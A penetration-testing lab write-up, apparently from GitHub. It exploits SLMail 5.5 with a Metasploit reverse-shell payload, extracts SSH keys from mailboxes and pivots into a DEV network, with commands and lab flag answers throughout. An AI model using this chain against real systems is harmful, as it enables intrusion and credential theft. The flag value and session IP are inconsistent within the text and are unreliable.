# 🔓 Cracking the Perimeter - DMZ Exploitation & DEV Network Pivoting

## 📌 Overview
This project is a penetration testing lab focused on firewall evasion, DMZ compromise, and lateral network pivoting. The objective is to break through the firewall to reach the DMZ, exploit vulnerable mail services, extract embedded SSH credentials, and pivot to an isolated DEV network. This lab demonstrates the critical importance of thorough system enumeration, email intelligence gathering, and multi-stage network pivoting in real-world penetration testing scenarios.

🛠 Tools & Technologies Used
* Kali Linux – Penetration testing distribution
* Metasploit Framework – Exploit development and deployment
* meterpreter – Post-exploitation shell for remote system access
* nmap – Network reconnaissance and service enumeration
* base64 – Encoding/decoding utility for binary data extraction
* SSH – Secure shell for network pivoting and remote access
* unzip – Archive extraction for credential recovery

🔍 Exploitation Techniques & Features
| Technique | Description | Implementation |
|-----------|-------------|-----------------|
| **Network Enumeration** | Identifies open ports and running services on the target | Used `nmap -sC -sV` to discover SLMail SMTP (port 25) and HTTP services |
| **Vulnerability Research** | Locates applicable exploits for identified services | Searched Metasploit for SLMail 5.5 POP3 buffer overflow vulnerability |
| **Buffer Overflow Exploitation** | Gains initial shell access through vulnerable mail service | Deployed `exploit/windows/pop3/seattlelab_pass` with reverse TCP payload |
| **Meterpreter Post-Exploitation** | Enumerates system files and services for further access | Listed SLMail directory to discover mailbox files containing intelligence |
| **Email Intelligence Gathering** | Extracts network topology and credentials from mail server logs | Parsed developer conversation in .mbx files to identify DEV network IP (10.10.70.19) |
| **Base64 Decoding** | Extracts embedded binary files from email attachments | Decoded Base64-encoded SSH key archive (`keys.zip`) from mailbox content |
| **SSH Key Extraction** | Obtains credentials for lateral movement | Unzipped and recovered `id_rsa` private key from decoded archive |
| **Network Pivoting** | Routes traffic through compromised DMZ to reach isolated networks | Used Metasploit `autoroute` module to add DEV subnet to routing table |
| **Port Forwarding** | Establishes SSH tunnel from attacker machine through DMZ pivot | Created local TCP relay (2222 → 10.10.70.19:22) for DEV network access |
| **Flag Extraction** | Retrieves sensitive data from target systems | Connected to DEV network via SSH and recovered flag from developer1 home directory |

📐 Lab Environment
* Attacker IP Address: 192.168.1.33
* DMZ Target (SLMail): 192.168.1.66
* Known Network: 192.168.1.0/24 (Firewall perimeter)
* DEV Network Target: 10.10.70.19 (Behind firewall, discovered via email intelligence)

🚀 Lab Solution

### Challenge Question 1: Base64 Encoded File Name
**Question:** What is the name of the Base64 encoded file in the .mbx file?

**Answer:** `keys.zip`

### Challenge Question 2: Extract the Flag
**Question:** Get the flag from the developer1 home directory.

**Answer:** `flag998877`

---

## Phase 1: Initial Reconnaissance

First, I performed network enumeration to identify the DMZ target:

```bash
# Scan the known network for open ports and services
nmap -sC -sV -v 192.168.1.66
```

**Results:**
- Port 25/tcp – SMTP (SLMail smtpd 5.5.0.4433)
- Port 80/tcp – HTTP (Apache 2.2.8)
- Port 110/tcp – POP3 (BVRP Software SLMail popd)

The SLMail 5.5 POP3 service was identified as vulnerable to a known buffer overflow exploit.

## Phase 2: Exploiting SLMail with Metasploit

I searched Metasploit for applicable exploits:

```
msf5 > search slmail
```

**Exploit Selected:** `exploit/windows/pop3/seattlelab_pass` (Seattle Lab Mail 5.5 POP3 Buffer Overflow)

Configuration and deployment:

```
msf5 > use exploit/windows/pop3/seattlelab_pass
msf5 exploit(windows/pop3/seattlelab_pass) > set RHOSTS 192.168.1.66
msf5 exploit(windows/pop3/seattlelab_pass) > set LHOST 192.168.1.33
msf5 exploit(windows/pop3/seattlelab_pass) > set LPORT 4444
msf5 exploit(windows/pop3/seattlelab_pass) > exploit
```

**Result:** Meterpreter session established (192.168.1.33:4444 → 192.168.1.62:8412)

## Phase 3: System Enumeration & Mailbox Discovery

After gaining shell access, I enumerated the SLMail directory structure:

```
meterpreter > ls C:\Program Files\SLMail\System
```

**Key Finding:** Multiple mailbox files discovered, including:
- `root@fakecorp.com.mbx` (13949 bytes) – **Target mailbox containing SSH credentials**
- `developer1@fakecorp.com.mbx` (2666 bytes)
- Various `maillog.00X` files

## Phase 4: Email Intelligence Extraction

I downloaded and examined the root mailbox:

```
meterpreter > download root@fakecorp.com.mbx
```

Inside the .mbx file, I found email conversations between root and developer1 discussing SSH setup and remote access methods. Critically, **the email headers and body contained the IP address 10.10.70.19**, which was identified as the DEV network machine.

The mailbox also contained a Base64-encoded attachment with the following header:

```
Content-Type: application/zip;
name="keys.zip"
Content-Transfer-Encoding: base64
Content-Disposition: attachment;
filename="keys.zip"
```

## Phase 5: DNS Enumeration & FQDN Validation

After identifying the IP address 10.10.70.19 from the email intelligence, I performed DNS lookups to validate and confirm the fully qualified domain name:

```bash
# DNS lookup from the compromised DMZ system
nslookup DEV1.fakecorp.com
```

**DNS Resolution Results:**
- **Name:** DEV1.fakecorp.com
- **Address:** 10.10.70.19
- **Server:** dmzns.fakecorp.com (10.10.10.11)

This DNS verification confirmed that the IP address extracted from the email was accurate and provided the FQDN (Fully Qualified Domain Name) of the target system. The email conversation had also explicitly mentioned:

```
> On 10/11/2020 2:09 PM, Developer1 wrote:
>> Also the FQDN of my workstation is DEV1.fakecorp.com
```

This multi-source validation (email mention + DNS confirmation) ensured I had the correct target before attempting pivot configuration.

## Phase 6: Base64 Decoding & SSH Key Extraction

I extracted and decoded the Base64 content:

```bash
# Decode the Base64-encoded attachment
base64 -d base64_decode.txt > keys.zip

# Extract the SSH keys from the archive
unzip keys.zip
```

**Extracted SSH Keys:**
- `/home/student/.ssh/id_rsa` – Private key
- `/home/student/.ssh/id_rsa.pub` – Public key
- `/home/student/.ssh/authorized_keys` – Authorized keys file

## Phase 7: Network Pivoting Setup

With the SSH private key and DEV network IP address identified, I configured Metasploit for network pivoting:

```
meterpreter > run post/multi/manage/autoroute SUBNET=10.10.70.0 NETMASK=/24
```

This added the 10.10.70.0/24 subnet to the meterpreter routing table, allowing traffic destined for the DEV network to be routed through the compromised DMZ machine.

Next, I established a local port forward:

```
meterpreter > portfwd add -l 2222 -p 22 -r 10.10.70.19
```

This created a local TCP relay on port 2222 that forwards SSH connections to the DEV network machine (10.10.70.19:22).

## Phase 8: DEV Network Access & Flag Retrieval

With the pivot established, I connected to the DEV network using the extracted SSH private key:

```bash
# Connect via SSH through the port forward pivot
ssh -i /home/student/.ssh/id_rsa developer1@127.0.0.1 -p 2222
```

**Result:** Successfully authenticated on the DEV network (Ubuntu 20.04.1 LTS)

I then navigated to the developer1 home directory and retrieved the flag:

```bash
developer1@dev1:~$ ls
Desktop  Documents  Downloads  examples.desktop  flag.txt  keys.zip  Mail  Music  Pictures  Public  Templates  Videos

developer1@dev1:~$ cat flag.txt
flag998877
```

**Flag retrieved:** `flag0098877` (Challenge Question 2 Answer)

📸 Screenshots
* [Initial nmap reconnaissance discovering SLMail vulnerability]<img width="928" height="372" alt="Screenshot 2025-11-08 001632" src="https://github.com/user-attachments/assets/b79ba023-a119-41ff-932d-b08058716c78" />
* [Metasploit exploit selection and configuration]<img width="1014" height="199" alt="Screenshot 2025-11-08 001723" src="https://github.com/user-attachments/assets/9f51cf35-f2fb-455f-b35e-a6fe77dbbb5f" />

* [Successful meterpreter session establishment]<img width="1020" height="554" alt="Screenshot 2025-11-08 001740" src="https://github.com/user-attachments/assets/c7d0a617-9e13-4a26-baba-85a246c615d4" />

* [System enumeration revealing mailbox files]<img width="721" height="581" alt="Screenshot 2025-11-08 002009" src="https://github.com/user-attachments/assets/633071b0-b0c8-470a-ac79-f6d54abe800d" />

* [Mailbox download and email intelligence extraction]<img width="805" height="561" alt="Screenshot 2025-11-08 002032" src="https://github.com/user-attachments/assets/32b5e9ef-9286-41b6-abca-fdddf9b99b31" />

* [Base64-encoded SSH key attachment discovery]<img width="1016" height="619" alt="Screenshot 2025-11-08 002101" src="https://github.com/user-attachments/assets/96595a5d-12ce-4fad-be0f-73ace0c5489a" />

* [Email conversation revealing DEV network IP address]<img width="1020" height="632" alt="Screenshot 2025-11-08 002127" src="https://github.com/user-attachments/assets/e3455573-cd1d-443b-92f0-6ffa91deb83e" />

* [Base64 decoding file]<img width="1002" height="32" alt="Screenshot 2025-11-08 002215" src="https://github.com/user-attachments/assets/a4f005ce-0d39-477a-8ca2-16288a26ea6c" />

* [SSH key archive extraction]<img width="1006" height="125" alt="Screenshot 2025-11-08 002241" src="https://github.com/user-attachments/assets/27797a0c-0bef-4507-8213-21f5b2fdf26d" />

* [Network pivoting and port forwarding setup]<img width="1007" height="128" alt="Screenshot 2025-11-08 002306" src="https://github.com/user-attachments/assets/c27b3f94-4e49-416e-a441-c2f71df160c5" />

* [DEV network SSH connection and flag retrieval]<img width="1005" height="465" alt="Screenshot 2025-11-08 002352" src="https://github.com/user-attachments/assets/c3fea906-f450-4c53-9ac3-91d4b6ea396e" />

* [DNS enumeration revealing DEV1.fakecorp.com (10.10.70.19)]<img width="1003" height="136" alt="Screenshot 2025-11-08 005300" src="https://github.com/user-attachments/assets/9fb50d21-408c-4a5c-afd5-3889ca501ad0" />

* [Email conversation trail confirming SSH setup and FQDN]<img width="1001" height="305" alt="Screenshot 2025-11-08 005322" src="https://github.com/user-attachments/assets/c94e4966-dbf7-45bb-b5cd-3d0f5983bf30" />


## 🔧 Troubleshooting & Lessons Learned

### Initial Mistakes & Corrections

This lab required multiple attempts and strategic pivots to reach the correct solution:

**Attempt 1: Incorrect IP Address Targeting**
- Initial assumption: The DEV network machine was at 10.10.10.11
- Result: Failed SSH connection attempts
- Root cause: I had not yet extracted the correct IP from the email conversations
- Resolution: Careful review of the .mbx file email chain revealed the correct address was **10.10.70.19**

**Key Discovery:** The email chain between root and developer1 explicitly stated:
```
> On 10/11/2020 2:09 PM, Developer1 wrote:
>> Also the FQDN of my workstation is DEV1.fakecorp.com
>>
> On 10/11/20 1:52 PM, root wrote:
>>> Good. Email me the key and i will install it on the machines you
>>> will be accessing.
```

This conversation, combined with DNS lookup verification, confirmed that **DEV1.fakecorp.com = 10.10.70.19**.

**Attempt 2: Direct SSH Connection from Kali**
```bash
# Attempted from attacker machine (Kali Linux)
ssh -i id_rsa developer1@10.10.70.19
```
- Result: Connection refused / timeout
- Root cause: The DEV network (10.10.70.0/24) is isolated behind the firewall and not directly reachable from the attacker's machine
- Lesson: Direct connection to isolated networks is not always possible; routing must be established first

**Attempt 3: SSH from Compromised System**
```bash
# Attempted from within the meterpreter shell on DMZ
ssh -i id_rsa developer1@10.10.70.19
```
- Result: SSH binary not available or connection issues
- Root cause: Limited shell environment on Windows DMZ machine; attempting to use SSH from a compromised Windows system was not the intended approach
- Lesson: Post-exploitation pivoting requires proper route configuration in the attacker's framework

**Successful Attempt 4: Metasploit Routing & Port Forwarding**

The solution required a three-step process:

1. **Add DEV network to Metasploit routing table:**
```
meterpreter > run post/multi/manage/autoroute SUBNET=10.10.70.0 NETMASK=/24
```
This configures the meterpreter session to route all traffic destined for 10.10.70.0/24 through the compromised DMZ machine.

2. **Establish port forward:**
```
meterpreter > portfwd add -l 2222 -p 22 -r 10.10.70.19
```
This creates a local listener on port 2222 that forwards traffic to the DEV machine's SSH port (22) through the meterpreter tunnel.

3. **Connect via localhost:**
```bash
ssh -i id_rsa developer1@127.0.0.1 -p 2222
```
By connecting to localhost:2222, the connection is transparently forwarded through the meterpreter route to the DEV network.

### Why This Process Was Necessary

- **Network Isolation:** The 10.10.70.0/24 subnet has no direct routing from the attacker network (192.168.1.0/24)
- **Firewall Rules:** Only the compromised DMZ machine has bi-directional connectivity to both networks
- **Proxy Requirement:** All DEV network traffic must be tunneled through an established meterpreter session
- **Framework Integration:** Metasploit's `autoroute` and `portfwd` modules are specifically designed to handle this multi-hop pivoting scenario

### Critical Insights

✅ **Enumeration requires persistence** – Initial incorrect IP (10.10.10.11) would have failed; careful reading of all communications revealed the correct address.

✅ **Routing must precede direct access** – You cannot SSH to an isolated network without establishing routes first; attempting direct connection skips a critical step.

✅ **Metasploit framework features enable complex pivoting** – The combination of `autoroute` and `portfwd` are not just conveniences—they are essential for accessing networks behind compromised intermediaries.

✅ **Use your established footholds** – The DMZ meterpreter session was the pivot point; attempting to bypass it (direct SSH or SSH from Windows) prevented success.

✅ **Trial and error is part of the process** – This lab demonstrated that penetration testing often requires hypothesis testing; each failed attempt provided information that led to the correct solution.

---

✅ Key Takeaways & Best Practices

🔹 **Email servers contain critical network intelligence** – User communications often reveal infrastructure details, IP addresses, and access methods that directly support lateral movement.

🔹 **Enumeration extends beyond filesystem scanning** – Non-traditional sources like mailbox files can contain encoded credentials and topology information essential for pivoting.

🔹 **Always examine service versions for known vulnerabilities** – Older services like SLMail 5.5 have well-documented exploits available in Metasploit and other exploit databases.

🔹 **Meterpreter post-exploitation provides powerful pivoting capabilities** – The `autoroute` module combined with `portfwd` enables seamless access to isolated networks behind compromised systems.

🔹 **Base64-encoded attachments can hide binary payloads** – Email systems frequently encode SSH keys, certificates, and other credentials; always inspect .mbx file contents thoroughly.

🔹 **SSH key reuse across network segments is a security risk** – In this lab, the same SSH key pair was used across the DMZ and DEV network, enabling lateral movement with extracted credentials.

🔹 **Multi-stage exploitation requires patience and attention to detail** – Success required careful coordination of vulnerability exploitation, file extraction, credential decoding, and network pivoting.

---

## 📚 Lab Difficulty: Intermediate

**Skills Demonstrated:**
- Network enumeration and vulnerability research
- Metasploit exploitation and meterpreter usage
- Post-exploitation system enumeration
- Intelligence gathering from email systems
- Base64 encoding/decoding
- SSH key extraction and usage
- Network pivoting and port forwarding
- Multi-stage lateral movement

**Lessons Learned:**
This lab showcases that penetration testing success depends not only on exploit development but also on thorough information gathering from all available sources—including seemingly non-technical communications. The combination of vulnerability exploitation, email intelligence, and network pivoting mirrors real-world attack chains where defenders must consider human factors, configuration oversights, and interconnected network architecture.
